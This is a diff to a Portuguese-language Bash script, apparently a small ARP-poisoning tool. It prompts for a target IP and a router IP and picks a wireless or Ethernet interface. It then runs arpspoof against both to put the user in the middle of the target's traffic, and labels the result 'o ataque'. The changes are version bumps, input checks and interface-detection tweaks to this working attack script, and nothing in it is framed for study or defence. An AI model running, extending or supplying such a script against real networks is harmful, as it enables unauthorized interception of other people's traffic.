@@ -27,7 +27,7 @@ LINES="$(tput lines)"
 AUTHOR="Lucas Vieira"
 V_MAJOR="1"
 V_MINOR="0"
-V_PATCH="0"
+V_PATCH="1"
 TAMANHO_LINHA=62
 
 # Subrotinas
@@ -79,7 +79,7 @@ function verifica_ip_forward()
 
 function checa_host
 {
-	ping -c 4 $1 > /dev/null
+	ping -q -c 4 $1 > /dev/null
 	if [ "$?" == "2" ]; then
 		log_err "Ip incorreto\n"
 		exit $?
@@ -98,6 +98,11 @@ function get_alvos()
 	read -p 'Ip do alvo: ' ip_alvo
 	read -p 'Ip do roteador: ' ip_roteador
 	
+	if [ "$ip_alvo" == "$ip_roteador" ]; then
+		log_err "Alvo e roteador sao os mesmos?"
+		exit 1
+	fi
+
 	log_info "Verificando alvo ..."
 	checa_host $ip_alvo
 	log_info "Verificando roteador ..."
@@ -115,14 +120,15 @@ function get_alvos()
 
 function get_interface()
 {
-	lista_interfaces="$(ifconfig | grep -e wlan[0-9] --colour=always -o)"
-	if [ "$lista_interfaces" == "1" ]; then
-		log_err "Nenhuma interface wireless encontrada"
-		return 1
+	lista_interfaces="$(ifconfig | grep -E 'wlan[0-9]|eth[0-9]' -o --color=always)"
+	if [ "$?" != "0" ]; then
+		log_err "Um erro ocorreu. Nao foi possivel listar as interfaces disponiveis"
+		exit 1
 	else
 		log_ok "Interfaces wireless encontradas:\n"
 		echo -e "$lista_interfaces\n"
-		read -p "Diga-me qual devo usar: " interface
+		log_pergunta "Diga-me qual devo usar: "
+		read interface
 		return 0
 	fi
 }
@@ -178,7 +184,7 @@ function main()
 	done
 
 	get_interface
-	echo $interface | grep -e wlan[0-9] -o > /dev/null
+	echo $interface | grep -e wlan -e eth -o > /dev/null
 	if [ "$?" != "0" ]; then
 	log_err "Interface incorreta selecionada"
 	else
@@ -187,13 +193,13 @@ function main()
 
 	verifica_ip_forward
 	log_ok "Aplicando o envenenamento ARP ao alvo '$ip_alvo' ..."
-	arpspoof -i $interface -t $ip_alvo -r $ip_roteador
-	resetar_configs_pacotes_ipv4
+	envenenamento="$(arpspoof -i $interface -t $ip_alvo -r $ip_roteador)"
 	if [ "$?" != "0" ]; then
-	log_err "O ataque falhou. Erro $?"
+	log_err "O ataque falhou. Verifique se o pacote dsniff foi instalado"
 	else
 	log_ok "O ataque foi terminado com sucesso\n"
 	fi
+	resetar_configs_pacotes_ipv4
 }
 
 # Início
